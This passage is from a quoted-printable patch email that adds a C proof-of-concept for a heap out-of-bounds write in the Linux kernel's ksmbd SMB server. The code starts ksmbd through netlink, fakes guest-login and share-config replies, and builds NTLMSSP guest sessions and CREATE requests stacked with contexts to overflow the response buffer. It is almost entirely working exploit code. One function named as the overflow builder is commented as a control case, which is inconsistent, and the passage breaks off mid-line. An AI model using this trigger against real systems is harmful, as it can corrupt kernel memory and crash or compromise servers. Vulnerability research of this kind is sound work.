+	fprintf(stderr, "SET_INFO pdu=%zu: non-NUL EA name at packet tail\n", n);
+	smb_send(fd, buf, n);
+	rn = smb_recv(fd, rbuf, sizeof(rbuf));
+	fprintf(stderr, "SET_INFO reply=%zd status=%08x\n", rn,
+		rn >= 16 ? *(uint32_t *)(rbuf + 12) : 0xffffffffu);
+	sleep(2);
 	return 0;
 }
 
---===============1188433712424754634==
+--===============3053206820710942250==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment; filename="ksmbd-base.c"
+MIME-Version: 1.0
+
+/*
+ * ksmbd AAPL multi-context heap OOB write
+ *
+ * smb2_allocate_rsp_buf() sizes CREATE responses at MAX_CIFS_SMALL_BUFFER_SI=
+ZE
+ * (448) including the 4-byte RFC1002 header.  The create_rsp body starts at
+ * offset 4, and rsp->Buffer (first create context) is at +152 of the PDU.
+ * Usable context space =3D 448 - 4 - 152 =3D 292 bytes.
+ *
+ * smb2_open() appends one response context per requested create context with
+ * no remaining-space check:
+ *   lease_v2 (84) + mxac (36) + QFid (60) + AAPL (128) =3D 308 > 292
+ *
+ * Additionally create_aapl_rsp_buf() writes a 31-char UTF-16 model string
+ * starting at offset 68 of the AAPL slot, ending at 130, while the slot is
+ * accounted as AAPL_RSP_MAX_SIZE=3D128.
+ *
+ * Trigger: guest session + TIME_MACHINE share + CREATE requesting
+ * RqLs + MxAc + QFid + AAPL(MODEL_INFO), with aapl_model =3D 31 chars.
+ */
+#define _GNU_SOURCE
+#include <sched.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <linux/netlink.h>
+#include <linux/genetlink.h>
+
+#ifndef NLA_OK
+#define NLA_OK(nla, rem) ((rem) >=3D (int)sizeof(struct nlattr) && \
+	(nla)->nla_len >=3D sizeof(struct nlattr) && (nla)->nla_len <=3D (rem))
+#define NLA_NEXT(nla, rem) ((rem) -=3D NLA_ALIGN((nla)->nla_len), \
+	(struct nlattr *)((char *)(nla) + NLA_ALIGN((nla)->nla_len)))
+#endif
+
+#define KSMBD_GENL_NAME		"SMBD_GENL"
+#define KSMBD_GENL_VERSION	0x01
+#define KSMBD_EVENT_STARTING_UP		2
+#define KSMBD_EVENT_LOGIN_REQUEST	4
+#define KSMBD_EVENT_LOGIN_RESPONSE	5
+#define KSMBD_EVENT_SHARE_CONFIG_REQUEST 6
+#define KSMBD_EVENT_SHARE_CONFIG_RESPONSE 7
+#define KSMBD_EVENT_TREE_CONNECT_REQUEST  8
+#define KSMBD_EVENT_TREE_CONNECT_RESPONSE 9
+
+#define KSMBD_REQ_MAX_ACCOUNT_NAME_SZ	48
+#define KSMBD_REQ_MAX_HASH_SZ		18
+#define KSMBD_REQ_MAX_SHARE_NAME	64
+
+#define KSMBD_USER_FLAG_OK		(1u << 0)
+#define KSMBD_USER_FLAG_GUEST_ACCOUNT	(1u << 4)
+#define KSMBD_SHARE_FLAG_AVAILABLE	(1u << 0)
+#define KSMBD_SHARE_FLAG_WRITEABLE	(1u << 2)
+#define KSMBD_SHARE_FLAG_GUEST_OK	(1u << 4)
+#define KSMBD_SHARE_FLAG_OPLOCKS	(1u << 7)
+#define KSMBD_SHARE_FLAG_TIME_MACHINE	(1u << 18)
+
+struct ksmbd_startup_request {
+	uint32_t flags; int32_t signing;
+	int8_t min_prot[16], max_prot[16], netbios_name[16];
+	int8_t work_group[64], server_string[64];
+	uint16_t tcp_port, ipc_timeout;
+	uint32_t deadtime, file_max, smb2_max_write, smb2_max_read;
+	uint32_t smb2_max_trans, share_fake_fscaps, sub_auth[3];
+	uint32_t smb2_max_credits, smbd_max_io_size, max_connections;
+	int8_t bind_interfaces_only;
+	uint32_t max_ip_connections;
+	int8_t aapl_model[32], reserved[467];
+	uint32_t ifc_list_sz;
+} __attribute__((packed));
+
+/* ---- IPC structs: must match fs/smb/server/ksmbd_netlink.h layout AND
+ * sizeof.  The kernel structs are NOT __packed; the nla_policy .len check
+ * uses sizeof(struct ksmbd_login_response) =3D=3D 148 (2 bytes tail pad befo=
+re
+ * reserved[]).  Do not mark these __packed. ---- */
+struct ksmbd_login_request {
+	uint32_t handle;
+	int8_t account[KSMBD_REQ_MAX_ACCOUNT_NAME_SZ];
+	uint32_t reserved[16];
+};
+
+struct ksmbd_login_response {
+	uint32_t handle;
+	uint32_t gid;
+	uint32_t uid;
+	int8_t  account[KSMBD_REQ_MAX_ACCOUNT_NAME_SZ];
+	uint16_t status;
+	uint16_t hash_sz;
+	int8_t  hash[KSMBD_REQ_MAX_HASH_SZ];
+	uint32_t reserved[16];
+};
+
+struct ksmbd_share_config_request {
+	uint32_t handle;
+	int8_t share_name[KSMBD_REQ_MAX_SHARE_NAME];
+	uint32_t reserved[16];
+};
+
+struct ksmbd_share_config_response {
+	uint32_t handle;
+	uint32_t flags;
+	uint16_t create_mask;
+	uint16_t directory_mask;
+	uint16_t force_create_mode;
+	uint16_t force_directory_mode;
+	uint16_t force_uid;
+	uint16_t force_gid;
+	int8_t  share_name[KSMBD_REQ_MAX_SHARE_NAME];
+	uint32_t reserved[111];
+	uint32_t payload_sz;
+	uint32_t veto_list_sz;
+};
+
+struct ksmbd_tree_connect_request {
+	uint32_t handle;
+	uint16_t account_flags;
+	uint16_t flags;
+	uint64_t session_id;
+	uint64_t connect_id;
+	int8_t account[KSMBD_REQ_MAX_ACCOUNT_NAME_SZ];
+	int8_t share[KSMBD_REQ_MAX_SHARE_NAME];
+	int8_t peer_addr[64];
+	uint32_t reserved[16];
+};
+
+struct ksmbd_tree_connect_response {
+	uint32_t handle;
+	uint16_t status;
+	uint16_t connection_flags;
+	uint32_t reserved[16];
+};
+
+#define SMB2_PROTO	0x424D53FEu
+#define SMB2_NEGOTIATE	0
+#define SMB2_SESSION_SETUP	1
+#define SMB2_TREE_CONNECT	3
+#define SMB2_CREATE		5
+#define SMB2_CLOSE		6
+
+struct smb2_hdr {
+	uint32_t ProtocolId;
+	uint16_t StructureSize;
+	uint16_t CreditCharge;
+	uint32_t Status;
+	uint16_t Command;
+	uint16_t CreditRequest;
+	uint32_t Flags;
+	uint32_t NextCommand;
+	uint64_t MessageId;
+	uint32_t ProcessId;
+	uint32_t TreeId;
+	uint64_t SessionId;
+	uint8_t  Signature[16];
+} __attribute__((packed));
+
+static int nl_fd =3D -1;
+static volatile int ipc_running =3D 0;
+static uint64_t cur_mid =3D 0;
+static uint64_t session_id =3D 0;
+static uint32_t tree_id =3D 0;
+
+static int genl_family_id(void) {
+	int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+	if (fd < 0) return -1;
+	struct { struct nlmsghdr nlh; struct genlmsghdr gnl; char attrs[128]; } req;
+	memset(&req, 0, sizeof req);
+	req.nlh.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct genlmsghdr));
+	req.nlh.nlmsg_type =3D GENL_ID_CTRL;
+	req.nlh.nlmsg_flags =3D NLM_F_REQUEST;
+	req.gnl.cmd =3D CTRL_CMD_GETFAMILY;
+	req.gnl.version =3D 1;
+	struct nlattr *na =3D (struct nlattr *)req.attrs;
+	na->nla_type =3D CTRL_ATTR_FAMILY_NAME;
+	na->nla_len =3D NLA_HDRLEN + strlen(KSMBD_GENL_NAME) + 1;
+	memcpy((char *)na + NLA_HDRLEN, KSMBD_GENL_NAME, strlen(KSMBD_GENL_NAME) + 1=
+);
+	req.nlh.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct genlmsghdr)) + NLA_ALIGN(na=
+->nla_len);
+	if (send(fd, &req, req.nlh.nlmsg_len, 0) < 0) { close(fd); return -1; }
+	char buf[4096];
+	if (recv(fd, buf, sizeof buf, 0) < 0) { close(fd); return -1; }
+	close(fd);
+	struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
+	if (nlh->nlmsg_type =3D=3D NLMSG_ERROR) return -1;
+	struct genlmsghdr *gnl =3D (struct genlmsghdr *)NLMSG_DATA(nlh);
+	int rem =3D nlh->nlmsg_len - NLMSG_LENGTH(sizeof(*gnl));
+	struct nlattr *a =3D (struct nlattr *)((char *)gnl + sizeof(*gnl));
+	while (NLA_OK(a, rem)) {
+		if (a->nla_type =3D=3D CTRL_ATTR_FAMILY_ID)
+			return *(uint16_t *)((char *)a + NLA_HDRLEN);
+		a =3D NLA_NEXT(a, rem);
+	}
+	return -1;
+}
+
+static int start_ksmbd(int family) {
+	/* nl_fd must already exist in init_net: the kernel replies with
+	 * genlmsg_unicast(&init_net, ...), which cannot reach a socket in a
+	 * child netns. TCP is brought up in the new netns afterwards. */
+	if (nl_fd < 0) {
+		nl_fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+		if (nl_fd < 0) return -1;
+	}
+	struct ksmbd_startup_request *req =3D calloc(1, sizeof(*req));
+	/* Without DURABLE_HANDLE the lease/durable create-context parsers are
+	 * skipped entirely, so those response contexts never get appended. */
+	req->flags =3D (1u << 0) | (1u << 4);	/* LEASES | DURABLE_HANDLE */
+	req->signing =3D 0;
+	/* Invalid strings fall back to ksmbd defaults (SMB2.1..SMB3.1.1). */
+	strcpy((char *)req->min_prot, "SMB2_02");
+	strcpy((char *)req->max_prot, "SMB311");
+	strcpy((char *)req->netbios_name, "KSMBD");
+	strcpy((char *)req->work_group, "WG");
+	strcpy((char *)req->server_string, "ksmbd");
+	req->tcp_port =3D 445;
+	req->file_max =3D 100000;
+	req->smb2_max_write =3D 8388608;
+	req->smb2_max_read =3D 8388608;
+	req->smb2_max_trans =3D 8388608;
+	req->smb2_max_credits =3D 8192;
+	req->max_connections =3D 1024;
+	req->max_ip_connections =3D 1024;
+	req->ifc_list_sz =3D 0;
+	/* 31-char model: create_aapl_rsp_buf writes 62 UTF-16 bytes at +68 =3D 130
+	 * into a 128-byte AAPL slot (2-byte OOB even without the multi-ctx overflow=
+). */
+	memset(req->aapl_model, 'M', 31);
+
+	struct { struct nlmsghdr nlh; struct genlmsghdr gnl; char attrs[2048]; } msg;
+	memset(&msg, 0, sizeof msg);
+	msg.nlh.nlmsg_type =3D family;
+	msg.nlh.nlmsg_flags =3D NLM_F_REQUEST;
+	msg.gnl.cmd =3D KSMBD_EVENT_STARTING_UP;
+	msg.gnl.version =3D KSMBD_GENL_VERSION;
+	struct nlattr *na =3D (struct nlattr *)msg.attrs;
+	na->nla_type =3D KSMBD_EVENT_STARTING_UP;
+	na->nla_len =3D NLA_HDRLEN + sizeof(*req);
+	memcpy((char *)na + NLA_HDRLEN, req, sizeof(*req));
+	msg.nlh.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct genlmsghdr)) + NLA_ALIGN(na=
+->nla_len);
+	int r =3D send(nl_fd, &msg, msg.nlh.nlmsg_len, 0);
+	free(req);
+	return r < 0 ? -1 : 0;
+}
+
+static void nl_send_resp(int family, int cmd, const void *payload, int plen) {
+	char buf[1024];
+	memset(buf, 0, sizeof buf);
+	struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
+	struct genlmsghdr *gnl =3D (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
+	nlh->nlmsg_type =3D family;
+	nlh->nlmsg_flags =3D NLM_F_REQUEST;
+	gnl->cmd =3D cmd;
+	gnl->version =3D KSMBD_GENL_VERSION;
+	struct nlattr *na =3D (struct nlattr *)(buf + NLMSG_HDRLEN + GENL_HDRLEN);
+	na->nla_type =3D cmd;
+	na->nla_len =3D NLA_HDRLEN + plen;
+	memcpy((char *)na + NLA_HDRLEN, payload, plen);
+	nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(struct genlmsghdr)) + NLA_ALIGN(na->n=
+la_len);
+	send(nl_fd, buf, nlh->nlmsg_len, 0);
+}
+
+static void *ipc_thread(void *arg) {
+	int family =3D (int)(long)arg;
+	char buf[8192];
+	struct timeval tv =3D { .tv_sec =3D 1 };
+	setsockopt(nl_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
+	ipc_running =3D 1;
+	while (ipc_running) {
+		ssize_t n =3D recv(nl_fd, buf, sizeof buf, 0);
+		if (n < (ssize_t)sizeof(struct nlmsghdr)) continue;
+		struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
+		fprintf(stderr, "[NL] type=3D%d (family=3D%d) len=3D%u flags=3D0x%x\n",
+			nlh->nlmsg_type, family, nlh->nlmsg_len, nlh->nlmsg_flags);
+		if (nlh->nlmsg_type =3D=3D 2 && n >=3D (ssize_t)(sizeof(struct nlmsghdr) + =
+4)) {
+			int err =3D *(int *)(buf + sizeof(struct nlmsghdr));
+			fprintf(stderr, "[NL] NLMSG_ERROR err=3D%d (%s)\n", err, strerror(-err));
+		}
+		if (nlh->nlmsg_type !=3D family) continue;
+		struct genlmsghdr *gnl =3D (struct genlmsghdr *)NLMSG_DATA(nlh);
+		int cmd =3D gnl->cmd;
+		struct nlattr *a =3D (struct nlattr *)((char *)gnl + sizeof(*gnl));
+		int rem =3D nlh->nlmsg_len - NLMSG_LENGTH(sizeof(*gnl));
+		void *payload =3D NULL; int plen =3D 0;
+		while (NLA_OK(a, rem)) { payload =3D (char *)a + NLA_HDRLEN; plen =3D a->nl=
+a_len - NLA_HDRLEN; a =3D NLA_NEXT(a, rem); }
+		if (!payload) continue;
+
+		fprintf(stderr, "[IPC] cmd=3D%d plen=3D%d\n", cmd, plen);
+		if (cmd =3D=3D KSMBD_EVENT_LOGIN_REQUEST && plen >=3D (int)sizeof(struct ks=
+mbd_login_request)) {
+			struct ksmbd_login_request *lr =3D payload;
+			struct ksmbd_login_response resp;
+			memset(&resp, 0, sizeof resp);
+			resp.handle =3D lr->handle;
+			resp.gid =3D 100;
+			resp.uid =3D 100;
+			memcpy(resp.account, lr->account, KSMBD_REQ_MAX_ACCOUNT_NAME_SZ);
+			resp.status =3D KSMBD_USER_FLAG_OK | KSMBD_USER_FLAG_GUEST_ACCOUNT;
+			resp.hash_sz =3D 16;
+			memset(resp.hash, 0x11, 16);
+			fprintf(stderr, "[IPC] LOGIN account=3D'%s' handle=3D%u -> guest (sizeof r=
+esp=3D%zu)\n",
+				resp.account, resp.handle, sizeof(resp));
+			nl_send_resp(family, KSMBD_EVENT_LOGIN_RESPONSE, &resp, sizeof(resp));
+		} else if (cmd =3D=3D KSMBD_EVENT_SHARE_CONFIG_REQUEST && plen >=3D (int)si=
+zeof(struct ksmbd_share_config_request)) {
+			struct ksmbd_share_config_request *sr =3D payload;
+			fprintf(stderr, "[IPC] SHARE_CONFIG share=3D'%s'\n", sr->share_name);
+			char sresp[2048];
+			memset(sresp, 0, sizeof sresp);
+			struct ksmbd_share_config_response *r =3D (void *)sresp;
+			r->handle =3D sr->handle;
+			r->flags =3D KSMBD_SHARE_FLAG_AVAILABLE | KSMBD_SHARE_FLAG_WRITEABLE |
+				   KSMBD_SHARE_FLAG_GUEST_OK | KSMBD_SHARE_FLAG_OPLOCKS |
+				   KSMBD_SHARE_FLAG_TIME_MACHINE;
+			r->create_mask =3D 0644;
+			r->directory_mask =3D 0755;
+			strcpy(r->share_name, "TEST");
+			const char *path =3D "/tmp";
+			uint32_t plen2 =3D strlen(path) + 1;
+			r->payload_sz =3D plen2;
+			r->veto_list_sz =3D 0;
+			memcpy(sresp + sizeof(*r), path, plen2);
+			fprintf(stderr, "[IPC] SHARE_CONFIG -> flags=3D0x%x sizeof=3D%zu payload=
+=3D%u\n",
+				r->flags, sizeof(*r), plen2);
+			nl_send_resp(family, KSMBD_EVENT_SHARE_CONFIG_RESPONSE, sresp, sizeof(*r) =
++ plen2);
+		} else if (cmd =3D=3D KSMBD_EVENT_TREE_CONNECT_REQUEST && plen >=3D (int)si=
+zeof(struct ksmbd_tree_connect_request)) {
+			struct ksmbd_tree_connect_request *tr =3D payload;
+			struct ksmbd_tree_connect_response resp;
+			memset(&resp, 0, sizeof resp);
+			resp.handle =3D tr->handle;
+			resp.status =3D 0;
+			resp.connection_flags =3D 0x3;
+			fprintf(stderr, "[IPC] TREE_CONNECT share=3D'%s' sess=3D0x%llx -> ok\n",
+				tr->share, (unsigned long long)tr->session_id);
+			nl_send_resp(family, KSMBD_EVENT_TREE_CONNECT_RESPONSE, &resp, sizeof(resp=
+));
+		}
+	}
+	return NULL;
+}
+
+static void put_hdr(uint8_t *buf, uint16_t cmd, uint64_t mid, uint32_t flags)=
+ {
+	struct smb2_hdr *h =3D (struct smb2_hdr *)(buf + 4);
+	memset(buf + 4, 0, 64);
+	h->ProtocolId =3D SMB2_PROTO;
+	h->StructureSize =3D 64;
+	h->Command =3D cmd;
+	h->CreditRequest =3D 31;
+	h->Flags =3D flags;
+	h->MessageId =3D mid;
+	h->ProcessId =3D 0;
+	h->TreeId =3D tree_id;
+	h->SessionId =3D session_id;
+}
+
+static size_t smb_send(int fd, uint8_t *buf, size_t pdu_len) {
+	*(uint32_t *)buf =3D __builtin_bswap32(pdu_len);
+	return write(fd, buf, pdu_len + 4) =3D=3D (ssize_t)(pdu_len + 4) ? pdu_len +=
+ 4 : 0;
+}
+
+static ssize_t smb_recv(int fd, uint8_t *buf, size_t cap) {
+	struct timeval tv =3D { .tv_sec =3D 5 };
+	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
+	return read(fd, buf, cap);
+}
+
+static size_t build_negotiate(uint8_t *buf) {
+	memset(buf, 0, 512);
+	put_hdr(buf, SMB2_NEGOTIATE, cur_mid++, 0);
+	uint8_t *p =3D buf + 4 + 64;
+	*(uint16_t *)p =3D 36; p +=3D 2;
+	*(uint16_t *)p =3D 2; p +=3D 2;	/* DialectCount */
+	*(uint16_t *)p =3D 1; p +=3D 2;	/* SecurityMode signing enabled */
+	*(uint16_t *)p =3D 0; p +=3D 2;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	memset(p, 0x41, 16); p +=3D 16;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	*(uint16_t *)p =3D 0; p +=3D 2;
+	*(uint16_t *)p =3D 0; p +=3D 2;
+	*(uint16_t *)p =3D 0x0210; p +=3D 2;	/* SMB 2.1 */
+	*(uint16_t *)p =3D 0x0300; p +=3D 2;	/* SMB 3.0 -> lease_v2 in rsp */
+	while ((p - buf) & 7) *p++ =3D 0;
+	return (p - buf) - 4;
+}
+
+static size_t build_sesssetup1(uint8_t *buf) {
+	memset(buf, 0, 512);
+	put_hdr(buf, SMB2_SESSION_SETUP, cur_mid++, 0);
+	uint8_t *p =3D buf + 4 + 64;
+	*(uint16_t *)p =3D 25; p +=3D 2;
+	*p++ =3D 0;
+	*p++ =3D 1;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	uint16_t sec_off =3D 64 + 24;
+	*(uint16_t *)(buf + 4 + 64 + 12) =3D sec_off;
+	uint8_t *sec =3D buf + 4 + sec_off;
+	memcpy(sec, "NTLMSSP", 8); sec +=3D 8;
+	*(uint32_t *)sec =3D 1; sec +=3D 4;
+	*(uint32_t *)sec =3D 0x00008207; sec +=3D 4;
+	*(uint16_t *)sec =3D 0; sec +=3D 2;
+	*(uint16_t *)sec =3D 0; sec +=3D 2;
+	*(uint32_t *)sec =3D 0; sec +=3D 4;
+	*(uint16_t *)sec =3D 0; sec +=3D 2;
+	*(uint16_t *)sec =3D 0; sec +=3D 2;
+	*(uint32_t *)sec =3D 0; sec +=3D 4;
+	uint16_t sec_len =3D sec - (buf + 4 + sec_off);
+	*(uint16_t *)(buf + 4 + 64 + 14) =3D sec_len;
+	p =3D sec;
+	while ((p - buf) & 7) *p++ =3D 0;
+	return (p - buf) - 4;
+}
+
+/*
+ * NTLMSSP AUTHENTICATE (type 3) with username "g". Guest path skips NTLMv2
+ * verification entirely (user_guest()).
+ */
+static size_t build_sesssetup2_guest(uint8_t *buf) {
+	memset(buf, 0, 512);
+	put_hdr(buf, SMB2_SESSION_SETUP, cur_mid++, 0);
+	uint8_t *p =3D buf + 4 + 64;
+	*(uint16_t *)p =3D 25; p +=3D 2;
+	*p++ =3D 0;
+	*p++ =3D 1;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	uint16_t sec_off =3D 64 + 24;
+	*(uint16_t *)(buf + 4 + 64 + 12) =3D sec_off;
+	uint8_t *sec =3D buf + 4 + sec_off;
+	uint8_t *blob =3D sec;
+
+	/* authenticate_message: sig(8)+type(4)+6*secbuf(8 each)+flags(4) =3D 64 */
+	memset(blob, 0, 64);
+	memcpy(blob, "NTLMSSP", 8);
+	*(uint32_t *)(blob + 8) =3D 3;		/* NtLmAuthenticate */
+
+	/* payload after 64-byte header: username "g" (UTF-16LE) */
+	uint8_t *payload =3D blob + 64;
+	/* DomainName empty at offset 64 */
+	/* UserName at 64, len 2 */
+	payload[0] =3D 'g'; payload[1] =3D 0;
+	uint16_t name_len =3D 2;
+	uint32_t name_off =3D 64;
+
+	/* LmChallengeResponse empty */
+	*(uint16_t *)(blob + 12) =3D 0; *(uint16_t *)(blob + 14) =3D 0; *(uint32_t *=
+)(blob + 16) =3D 0;
+	/* NtChallengeResponse empty (guest) */
+	*(uint16_t *)(blob + 20) =3D 0; *(uint16_t *)(blob + 22) =3D 0; *(uint32_t *=
+)(blob + 24) =3D 0;
+	/* DomainName empty */
+	*(uint16_t *)(blob + 28) =3D 0; *(uint16_t *)(blob + 30) =3D 0; *(uint32_t *=
+)(blob + 32) =3D 0;
+	/* UserName */
+	*(uint16_t *)(blob + 36) =3D name_len;
+	*(uint16_t *)(blob + 38) =3D name_len;
+	*(uint32_t *)(blob + 40) =3D name_off;
+	/* Workstation empty */
+	*(uint16_t *)(blob + 44) =3D 0; *(uint16_t *)(blob + 46) =3D 0; *(uint32_t *=
+)(blob + 48) =3D 0;
+	/* SessionKey empty */
+	*(uint16_t *)(blob + 52) =3D 0; *(uint16_t *)(blob + 54) =3D 0; *(uint32_t *=
+)(blob + 56) =3D 0;
+	*(uint32_t *)(blob + 60) =3D 0x00008207;
+
+	sec +=3D 64 + name_len;
+	uint16_t sec_len =3D sec - (buf + 4 + sec_off);
+	*(uint16_t *)(buf + 4 + 64 + 14) =3D sec_len;
+	p =3D sec;
+	while ((p - buf) & 7) *p++ =3D 0;
+	return (p - buf) - 4;
+}
+
+/*
+ * create_context_hdr is 16 bytes (Next/NameOff/NameLen/Reserved16/DataOff/Da=
+taLen).
+ * smb2_find_context_vals() requires:
+ *   NameOffset =3D=3D 16, NameLength >=3D 4, DataOffset 8-aligned,
+ *   DataOffset >=3D 16 + (NameLength < 8 ? 8 : NameLength),
+ *   Next 8-aligned.
+ * So a 4-byte tag lives at 16..20, data starts at 24.
+ */
+static void append_ctx(uint8_t **pp, const char *tag, const void *data, uint3=
+2_t dlen) {
+	uint8_t *p =3D *pp;
+	while ((p - *pp) & 7) *p++ =3D 0;
+	uint8_t *ctx =3D p;
+	uint32_t cc_len =3D 24 + dlen;
+	uint32_t next =3D (cc_len + 7) & ~7u;
+
+	memset(ctx, 0, next);
+	*(uint32_t *)(ctx + 0) =3D 0;		/* Next: filled by caller chain */
+	*(uint16_t *)(ctx + 4) =3D 16;		/* NameOffset */
+	*(uint16_t *)(ctx + 6) =3D 4;		/* NameLength */
+	*(uint16_t *)(ctx + 8) =3D 0;		/* Reserved */
+	*(uint16_t *)(ctx + 10) =3D 24;		/* DataOffset (8-aligned) */
+	*(uint32_t *)(ctx + 12) =3D dlen;		/* DataLength */
+	memcpy(ctx + 16, tag, 4);
+	if (data && dlen)
+		memcpy(ctx + 24, data, dlen);
+	*pp =3D ctx + next;
+}
+
+/*
+ * CREATE requesting RqLs + MxAc + QFid + AAPL(MODEL_INFO).
+ * Response packing (response_buf =3D 448 incl. 4-byte RFC1002):
+ *   4 + 152 (create_rsp) + 84 (lease_v2) + 36 (mxac) + 60 (QFid) + 128 (AAPL)
+ *   =3D 464 > 448 allocation  =3D> 16-byte heap OOB write.
+ * AAPL model string then writes 2 more bytes past the 128-byte AAPL slot.
+ */
+static size_t build_create_overflow(uint8_t *buf) {
+	memset(buf, 0, 2048);
+	put_hdr(buf, SMB2_CREATE, cur_mid++, 0);
+	uint8_t *hdr =3D buf + 4;			/* start of smb2_hdr */
+	uint8_t *p =3D hdr + 64;
+
+	*(uint16_t *)p =3D 57; p +=3D 2;		/* StructureSize */
+	*p++ =3D 0;				/* SecurityFlags */
+	*p++ =3D 0xFF;				/* RequestedOplockLevel =3D LEASE */
+	*(uint32_t *)p =3D 0; p +=3D 4;		/* ImpersonationLevel */
+	memset(p, 0, 16); p +=3D 16;		/* SmbCreateFlags + Reserved */
+	*(uint32_t *)p =3D 0x00120089; p +=3D 4;	/* DesiredAccess */
+	*(uint32_t *)p =3D 0; p +=3D 4;		/* FileAttributes */
+	*(uint32_t *)p =3D 7; p +=3D 4;		/* ShareAccess */
+	*(uint32_t *)p =3D 1; p +=3D 4;		/* CreateDisposition FILE_OPEN */
+	*(uint32_t *)p =3D 0; p +=3D 4;		/* CreateOptions */
+	/* NameOffset / NameLength / CreateContextsOffset / CreateContextsLength */
+	/* Buffer[] begins at hdr+120 (=3D64+56). Use that for empty name. */
+	*(uint16_t *)p =3D 120; p +=3D 2;		/* NameOffset (from smb2 hdr) */
+	*(uint16_t *)p =3D 0; p +=3D 2;		/* NameLength =3D 0 (share root) */
+	uint8_t *ctx_off_p =3D p; p +=3D 4;
+	uint8_t *ctx_len_p =3D p; p +=3D 4;
+	/* p now at hdr+120, 8-aligned. Contexts start here. */
+	uint8_t *ctx_start =3D p;
+
+	/* RqLs: lease_context_v2 =3D 52 bytes (LeaseKey16 + State4 + Flags4 +
+	 * Duration8 + ParentKey16 + Epoch2 + Reserved2). */
+	uint8_t lease_req[52];
+	memset(lease_req, 0, sizeof lease_req);
+	memset(lease_req, 0x22, 16);			/* LeaseKey */
+	*(uint32_t *)(lease_req + 16) =3D 0x7;		/* RWH includes HANDLE_CACHING */
+	append_ctx(&p, "RqLs", lease_req, 52);
+
+	append_ctx(&p, "MxAc", NULL, 0);
+	append_ctx(&p, "QFid", NULL, 0);
+
+	/* DH2Q: durable_context_v2_req =3D Timeout4 + Flags4 + Reserved8 + CreateGu=
+id16 =3D 32 */
+	uint8_t dh2q[32];
+	memset(dh2q, 0, sizeof dh2q);
+	*(uint32_t *)dh2q =3D 0x0001d4c0;			/* Timeout =3D 120000 ms */
+	memset(dh2q + 16, 0x33, 16);			/* CreateGuid */
+	append_ctx(&p, "DH2Q", dh2q, 32);
+
+	/* CONTROL: no AAPL context -> create_aapl_rsp_buf() never runs,
+	 * response packing stays inside the 448-byte allocation. */
+
+	/* Chain Next: each context's Next =3D distance to the next one (8-aligned),
+	 * last one Next =3D 0. append_ctx already rounded each to 8 bytes. */
+	{
+		uint8_t *q =3D ctx_start;
+		while (q < p) {
+			uint32_t next =3D *(uint32_t *)q;
+			uint32_t step;
+			/* recompute step from the tag layout: 24 + dlen, rounded */
+			uint32_t dlen =3D *(uint32_t *)(q + 12);
+			step =3D (24 + dlen + 7) & ~7u;
+			if (q + step >=3D p)
+				next =3D 0;
+			else
+				next =3D step;
+			*(uint32_t *)q =3D next;
+			q +=3D step;
+		}
+	}
+
+	uint32_t ctx_len =3D (uint32_t)(p - ctx_start);
+	*(uint32_t *)ctx_off_p =3D (uint32_t)(ctx_start - hdr);	/* from smb2 hdr */
+	*(uint32_t *)ctx_len_p =3D ctx_len;
+
+	fprintf(stderr, "[CREATE-CTRL] pdu_len=3D%zu ctx_off=3D%u ctx_len=3D%u (no A=
+APL)\n",
+		(p - buf) - 4, (unsigned)(ctx_start - hdr), ctx_len);
+	return (p - buf) - 4;
+}
+
+static size_t build_create_reconnect(uint8_t *buf, uint64_t persistent,
+				     uint64_t volatile_id) {
+	memset(buf, 0, 2048);
+	put_hdr(buf, SMB2_CREATE, cur_mid++, 0);
+	uint8_t *hdr =3D buf + 4;
+	uint8_t *p =3D hdr + 64;
+	*(uint16_t *)p =3D 57; p +=3D 2;
+	*p++ =3D 0;
+	*p++ =3D 0xFF;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	memset(p, 0, 16); p +=3D 16;
+	*(uint32_t *)p =3D 0x00120089; p +=3D 4;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	*(uint32_t *)p =3D 7; p +=3D 4;
+	*(uint32_t *)p =3D 1; p +=3D 4;
+	*(uint32_t *)p =3D 0; p +=3D 4;
+	*(uint16_t *)p =3D 120; p +=3D 2;
+	*(uint16_t *)p =3D 0; p +=3D 2;
+	uint8_t *ctx_off_p =3D p; p +=3D 4;
+	uint8_t *ctx_len_p =3D p; p +=3D 4;
+	uint8_t *ctx_start =3D p;
+
+	uint8_t lease_req[52] =3D {0};
+	memset(lease_req, 0x22, 16);
+	*(uint32_t *)(lease_req + 16) =3D 0x7;
+	append_ctx(&p, "RqLs", lease_req, sizeof lease_req);
+
+	uint8_t dh2c[36] =3D {0};
+	*(uint64_t *)(dh2c + 0) =3D persistent;
+	*(uint64_t *)(dh2c + 8) =3D volatile_id;
+	memset(dh2c + 16, 0x33, 16);
+	append_ctx(&p, "DH2C", dh2c, sizeof dh2c);
+	*(uint32_t *)ctx_start =3D 80; /* RqLs context is 24 + 52, rounded to 80. */
+	*(uint32_t *)ctx_off_p =3D (uint32_t)(ctx_start - hdr);
+	*(uint32_t *)ctx_len_p =3D (uint32_t)(p - ctx_start);
+	fprintf(stderr, "[RECONNECT] pdu_len=3D%zu fid=3D(%llu,%llu) ctx_len=3D%u\n",
